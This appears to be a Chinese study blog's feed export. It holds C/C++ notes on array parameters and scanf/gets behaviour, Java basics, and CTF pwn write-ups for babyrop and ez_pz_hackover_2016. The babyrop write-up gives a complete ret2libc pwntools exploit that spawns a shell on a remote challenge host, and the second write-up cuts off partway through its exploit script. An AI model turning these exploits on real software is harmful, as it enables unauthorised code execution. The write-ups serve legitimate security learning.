class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h3><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230502162911210.png" alt="image-20230502162911210"></p><h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>C&#x2F;C++中如果一个函数接收一个数组作为参数，那么数组将会被退化为指针。</p><h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><p>如果实在想用**sizeof(b)&#x2F;sizeof(ELemType)**计算出数组的长度，可以现在main()函数里面进行计算，然后再将长度给入到函数中。</p><h2 id="2-数组作为函数参数，数组的值可以被修改"><a href="#2-数组作为函数参数，数组的值可以被修改" class="headerlink" title="2. 数组作为函数参数，数组的值可以被修改"></a>2. 数组作为函数参数，数组的值可以被修改</h2><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;stdio.h&gt;typedef int SqBinTreep[100];#define MaxSize 10void CreateSqBinTree1(SqBinTreep a)&#123;    for (int i &#x3D; 0; i &lt; MaxSize; i++)    &#123;        a[i]&#x3D;i;    &#125;&#125;void CreateSqBinTree2(SqBinTreep &amp;a)&#123;    for (int i &#x3D; 0; i &lt; MaxSize; i++)    &#123;        a[i]&#x3D;i;    &#125;    &#125;int main()&#123;    SqBinTreep a1;    SqBinTreep a2;    CreateSqBinTree1(a1);    CreateSqBinTree2(a2);    for (int i &#x3D; 0; i &lt; MaxSize; i++)    &#123;        printf(&quot;a1的第%d个元素的值为: %d\n&quot;,i,a1[i]);    &#125;    for (int i &#x3D; 0; i &lt; MaxSize; i++)    &#123;        printf(&quot;a2的第%d个元素的值为: %d\n&quot;,i,a2[i]);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230502165510832.png" alt="image-20230502165510832"></p><h2 id="3-若只是普通的传参，而不用数组或指针作为函数的参数，则数组里的值无法被修改"><a href="#3-若只是普通的传参，而不用数组或指针作为函数的参数，则数组里的值无法被修改" class="headerlink" title="3. 若只是普通的传参，而不用数组或指针作为函数的参数，则数组里的值无法被修改"></a>3. 若只是普通的传参，而不用数组或指针作为函数的参数，则数组里的值无法被修改</h2><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;stdio.h&gt;void add(int salary,int x)&#123;    salary +&#x3D; x;&#125; int main()&#123;    int salary &#x3D; 10000;    printf(&quot;加薪前: %d\n&quot;,salary);    add(salary,5000);    printf(&quot;加薪后: %d&quot;,salary);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行结果-1"><a href="#运行结果-1" class="headerlink" title="运行结果"></a>运行结果</h3><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230502170948159.png" alt="image-20230502170948159"></p><h1 id="二、scanf-、gets-函数"><a href="#二、scanf-、gets-函数" class="headerlink" title="二、scanf()、gets()函数"></a>二、scanf()、gets()函数</h1><p><strong>问题</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;stdio.h&gt;int main()&#123;    char a,b;    int i;    printf(&quot;请输入a的值: &quot;);    scanf(&quot;%c&quot;,&amp;a);    &#x2F;&#x2F;getchar();    &#x2F;&#x2F;gets(&amp;a);    printf(&quot;请输入b的值: &quot;);    scanf(&quot;%c&quot;,&amp;b);    printf(&quot;a&#x3D;%c,b&#x3D;%c&quot;,a,b);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>运行结果</strong></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230506213908276.png" alt="image-20230506213908276"></p><p>结果出错，<strong>原因分析：</strong><br>想象输入设备（键盘）连接着一个叫“缓冲”的东西，把缓冲认为是一个字符数组。<br>当你的程序执行到scanf时，会从你的缓冲区读东西，如果缓冲区是空的，就阻塞住，等待你从键盘输入。<br>现在假设你的缓冲区里有：abcd\n1234\n (其中\n是回车符)执行：scanf(“%s”,name);的时候，由于scanf是读数据直到看见空白符（空白符：指空格符、制表符、回车符）就停止的输入函数。所以执行后，把abcd存到了name中。缓冲区于是变成了 ： \n1234\n<br>接下来的执行就有问题了，如果遇到了：scanf(“%d”,&amp;number);怎么办？因为遇到了回车符，它并不是一个数字，所以scanf还有一个特性，就是忽略先导的空白符。不管是有几百个回车也好，几万个空格也罢，只要它们连续地出现在缓冲区的开头，就统统忽略他们。然后再读有意义的字符。于是1234被读入number。<br>回到刚刚，当缓冲区还是：\n1234\n的时候，如果遇到了：scanf(“%c”,&amp;sex);应该怎么办呢？你说，那好办呀，不是说了忽略前导空白符吗？跳过回车读’1’呀！想法是好的，可这只针对你的程序这一种情况。如果我编写的程序就是统计用户输入了多少个回车呢？所以对scanf来讲跳过前导空白符有个例外，当参数是%c的时候，就把缓冲区的第一个字符返回回去，不管是什么。<br>这样的设计就有个问题，scanf对不同的参数表现出来的特性不一样。得承认，这是个缺陷，但不是说这样不好。<br>这样的设计至少把发现所有字符的机会交给了用户，设计者这样想：如果程序员使用了scanf(“%c”,..)，那他就有必要知道这函数能把回车符读出来，至于程序员对回车符感不感兴趣，那就看他了，不感兴趣的话，程序员也一定知道该怎么处理。回到你的程序里。<br>当执行scanf(“%s”,name)的时候，要求你从键盘输入，于是你输入了”abc”，然后“回车”。缓冲区里自然而然地是：abc\nscanf把abc拿走了，留下了\n，缓冲区里现在就剩下\n于是，下一个scanf (“%c”,&amp;sex); 想当然地读取了\n</p><p><strong>解决办法</strong></p><p>1、使用getchar()函数，将缓冲区中的\n给输出来</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> a<span class="token punctuation">,</span>b<span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入a的值: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//gets(&amp;a);</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入b的值: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a=%c,b=%c"</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果如下</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230506214541200.png" alt="image-20230506214541200"></p><p>2、输入时不使用scanf()函数，直接使用gets()函数</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;stdio.h&gt;int main()&#123;    char a,b,c[20];    int i;    printf(&quot;请输入a的值: &quot;);    &#x2F;&#x2F; scanf(&quot;%c&quot;,&amp;a);    &#x2F;&#x2F;getchar();    gets(&amp;a);    printf(&quot;a&#x3D;%c\n&quot;,a);    printf(&quot;请输入b的值: &quot;);    scanf(&quot;%c&quot;,&amp;b);    &#x2F;&#x2F;gets(&amp;b);    printf(&quot;a&#x3D;%c,b&#x3D;%c&quot;,a,b);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果如下</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230506225158612.png" alt="image-20230506225158612"></p><p>3、当字符变量连续两次使用gets()函数</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;stdio.h&gt;int main()&#123;    char a,b,c[20];    int i;    printf(&quot;请输入a的值: &quot;);    &#x2F;&#x2F; scanf(&quot;%c&quot;,&amp;a);    &#x2F;&#x2F;getchar();    gets(&amp;a);    printf(&quot;a&#x3D;%c\n&quot;,a);    printf(&quot;请输入b的值: &quot;);    &#x2F;&#x2F;scanf(&quot;%c&quot;,&amp;b);    gets(&amp;b);    printf(&quot;a&#x3D;%c,b&#x3D;%c&quot;,a,b);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果如下</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230506225447288.png" alt="image-20230506225447288"></p><p>我们会发现a的值在最后变为空了，这是因为我们gets()函数结束时，会在字符的末尾加上NULL字符，函数在开始的时候，先将字符变量a入栈，然后是字符变量b入栈，第一个gets()时，变量a被赋予了a，其后面一个字节被置为了NULL，然后就第二个gets()函数，变量b被赋予了b，其后面一个字节就是变量a的位置，所以当我们使用第二个gets()函数的时候，变量a的值已经发生了变化，这也是gets()函数的一个缺陷吧，由此可以进行栈溢出，如果我们在开始的时候将变量a，b互换一下位置，也就是两个变量在栈内的位置进行互换，可以发现结果发生变化，变量a的值与变量b的值均正常。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;stdio.h&gt;int main()&#123;    char b,a,c[20];    int i;    printf(&quot;请输入a的值: &quot;);    &#x2F;&#x2F; scanf(&quot;%c&quot;,&amp;a);    &#x2F;&#x2F;getchar();    gets(&amp;a);    printf(&quot;a&#x3D;%c\n&quot;,a);    printf(&quot;请输入b的值: &quot;);    &#x2F;&#x2F;scanf(&quot;%c&quot;,&amp;b);    gets(&amp;b);    printf(&quot;a&#x3D;%c,b&#x3D;%c&quot;,a,b);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果如下</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230506230130534.png" alt="image-20230506230130534"></p>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java学习</title>
      <link href="/Java/Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
      <url>/Java/Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="JRE、JDK、JVM"><a href="#JRE、JDK、JVM" class="headerlink" title="JRE、JDK、JVM"></a>JRE、JDK、JVM</h1><p>1、编写代码的过程中，需要使用JRE中Java已经写好的代码。</p><p>2、编译代码的过程中，需要使用JDK中的翻译工具。</p><p>3、运行代码的过程中，需要使用JDK中的运行工具。</p><p>4、代码需要运行在JVM中。</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230806121544787.png" alt="image-20230806121544787"></p><h1 id="java类的组织形式"><a href="#java类的组织形式" class="headerlink" title="java类的组织形式"></a>java类的组织形式</h1><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/20230419002700.png"></p><h1 id="java-API文档"><a href="#java-API文档" class="headerlink" title="java API文档"></a>java API文档</h1><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230419003818106.png" alt="image-20230419003818106"></p><h1 id="字符编码"><a href="#字符编码" class="headerlink" title="字符编码"></a>字符编码</h1><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230419003900247.png" alt="image-20230419003900247"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230419003933206.png" alt="image-20230419003933206"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230419003946241.png" alt="image-20230419003946241"></p><h1 id="基本数据类型转换"><a href="#基本数据类型转换" class="headerlink" title="基本数据类型转换"></a>基本数据类型转换</h1><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230419004009289.png" alt="image-20230419004009289"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230419004028665.png" alt="image-20230419004028665"></p><h1 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h1><p>&amp; 逻辑与，| 逻辑或，       &amp;&amp; 短路与      || 短路或<br>逻辑与，两边的表达式都执行，短路与遇到false之后就不会进行执行了</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230419004102355.png" alt="image-20230419004102355"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230419004125667.png" alt="image-20230419004125667"></p><p>逻辑或，两边表达式都执行，短路或遇到TRUE之后就不会执行了</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230419004149268.png" alt="image-20230419004149268"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230419004204285.png" alt="image-20230419004204285"></p><h1 id="Java中的内存分配"><a href="#Java中的内存分配" class="headerlink" title="Java中的内存分配"></a>Java中的内存分配</h1><p>栈内存：方法运行时，进入的内存，局部变量都存放在这块内存中<br>堆内存：new出来的内容都会进入堆内存，并且会存在地址值<br>方法区：字节码文件（.class文件）加载时进入的内存<br>本地方法栈：调用操作系统相关资源<br>寄存器：交给CPU去使用</p><h1 id="面向对象的三个特征（封装、继承、多态）"><a href="#面向对象的三个特征（封装、继承、多态）" class="headerlink" title="面向对象的三个特征（封装、继承、多态）"></a>面向对象的三个特征（封装、继承、多态）</h1><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>1、私有成员变量，提供setXxx和getXxx方法。</p><p>2、将代码抽取到方法中，这是对代码的一种封装。</p><p>3、将属性抽取到类当中，这是对数据的一种封装。</p><p>好处：提高代码的安全性；提高代码的复用性。</p><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><h1 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h1><p>定义：构建、创造对象的时候，所调用的方法<br>格式：1、方法名和类名相同，大小写也要一致<br>​            2、没有返回值类型，连void都没有<br>​            3、没有具体的返回值（不能由return带回结果数据）<br>作用：用于给对象的数据（属性）进行初始化<br>注意事项：<br>1、构造方法的创建<br>①如果没有定义构造方法，系统将给出一个默认的无参数构造方法<br>②如果定义了构造方法，系统将不再提供默认的构造方法<br>2、构造方法的重载<br>如果自定义了带参构造方法，还要使用无参数构造方法，就必须再写一个无参数构造方法</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230807160518954.png" alt="image-20230807160518954"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230807160542427.png" alt="image-20230807160542427"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230807160551246.png" alt="image-20230807160551246"></p><h1 id="String和StringBuilder"><a href="#String和StringBuilder" class="headerlink" title="String和StringBuilder"></a>String和StringBuilder</h1><p><strong>根本区别：</strong>String不可改变；StringBuilder可以改变</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230807231552043.png" alt="image-20230807231552043"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230807231612486.png" alt="image-20230807231612486"> </p><p><strong>StringBuilder概述</strong><br>StringBuilder是一个可变的字符串类，可以将其看做是一个容器<br>作用：提高字符串的操作效率</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230807233215936.png" alt="image-20230807233215936"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230807233918842.png" alt="image-20230807233918842"><br><strong>注意：方法区不存在堆区中</strong><br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230807234213861.png" alt="image-20230807234213861"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230807235244205.png" alt="image-20230807235244205"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230807235445539.png" alt="image-20230807235445539"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230808000451017.png" alt="image-20230808000451017"></p><h1 id="集合与数组的区别对比"><a href="#集合与数组的区别对比" class="headerlink" title="集合与数组的区别对比"></a>集合与数组的区别对比</h1><p>集合类的特点：提供一种存储空间可变的存储模型，存储的数据容量可以发生改变<br>集合和数组的区别：</p><ul><li>共同点： 都是存储数据的容器</li><li>不同点：数组的容量是固定的我，集合的容量是可变的</li></ul><p>如果存储的数据，长度经常发生改变，推荐使用集合<br>ArrayList<String> list &#x3D; new ArrayList&lt;&gt;()；其中&lt;&gt;是对集合的类型进行限制</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230808004345067.png" alt="image-20230808004345067"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230808004616889.png" alt="image-20230808004616889"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230808004235952.png" alt="image-20230808004235952"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230808004246098.png" alt="image-20230808004246098"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(OGeek2019)babyrop</title>
      <link href="/ret2libc/%5BOGeek2019%5Dbabyrop/"/>
      <url>/ret2libc/%5BOGeek2019%5Dbabyrop/</url>
      
        <content type="html"><![CDATA[<h1 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h1><p><strong>read()函数当第一个参数为0时，可能是指示函数从文件或输入流的开头开始读取数据。</strong></p><p>首先对程序进行检查<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230809004956065.png" alt="image-20230809004956065"></p><p>发现不能在本地执行，放入ida中进行查看试试</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230809005741793.png" alt="image-20230809005741793"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230809005808197.png" alt="image-20230809005808197"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230809005823231.png" alt="image-20230809005823231"></p><p>程序主要实现的功能就是打开&#x2F;dev&#x2F;urandom取出一个随机字符串，read(fd,&amp;buf,4u)是把fd所指向的随机字符串写入到buf文件中，长度是4个字节，v6&#x3D;read(0,buf,0x20u)是将终端输入的0x20个字节读取到buf中，将buf和随机的字符串比较，如果相等就退出程序，不相等就返回v5的值，但是这个函数没有对v5进行处理，可以使用栈溢出，对v5进行赋值，v5的值决定了下一个函数对read在终端读取的字节数，通过对buf局部变量实现栈溢出，构造的exp如下所示：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">25845</span><span class="token punctuation">)</span><span class="token comment">#io = process('./pwn')</span>buf <span class="token operator">=</span> <span class="token string">b"\0"</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x7</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'\xff'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>buf<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>main_addr <span class="token operator">=</span> <span class="token number">0x8048825</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0xe7</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>write_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> write_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>sys_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>binsh_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>buf<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0xe7</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到的结果如下所示：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230809042046237.png" alt="image-20230809042046237"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230809042103876.png" alt="image-20230809042103876"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230809042128283.png" alt="image-20230809042128283"></p>]]></content>
      
      
      <categories>
          
          <category> ret2libc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ret2libc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ez_pz_hackover_2016</title>
      <link href="/ret2shellcode/ez_pz_hackover_2016/"/>
      <url>/ret2shellcode/ez_pz_hackover_2016/</url>
      
        <content type="html"><![CDATA[<h1 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h1><p>首先对程序进行检查，发现其并没有开启NX保护，那么我们就可以通过往栈上写入shellcode并执行</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20231008194644808.png" alt="image-20231008194644808"></p><p>放入ida中进行反编译</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20231008194722070.png" alt="image-20231008194722070"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20231008194736364.png" alt="image-20231008194736364"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20231008194747157.png" alt="image-20231008194747157"></p><p>得到的函数如上所示，在chall函数中，s的缓冲区大小为0x40c（1036）个字节，而fgets函数只允许我们输入1023个字节，所以无法在chall函数里面进行栈溢出，在vuln()函数里面缓冲区大小为0x32个字节，而我们可以写入0x400个字节，可执行栈溢出。</p><p>我们在vuln函数快结束的位置设置一个断点，接下来查看栈的基本情况。</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20231008195234433.png" alt="image-20231008195234433"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ez_pz_hackover_2016"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token string">'b *0x8048600'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"crash: "</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"stack_addr:"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b"crashme\x00"</span><span class="token operator">+</span><span class="token string">b'aaaaaa'</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20231008195403953.png" alt="image-20231008195403953"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20231008195409153.png" alt="image-20231008195409153"></p><p>我们输入的位置在0x22处，而ebp的位置在0x38处，要将返回地址给覆盖成shellcode的地址，那么偏移应该为0x38-0x22&#x3D;0x16，再加4，我们前面得到的s的地址为0xff8c4f6c，shellcode开始的地址应该在ebp+8的位置处，得到的偏移为0x5c-0x40&#x3D;0x1c，所以我们构造的exp如下所示：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#p = process("./ez_pz_hackover_2016")</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token 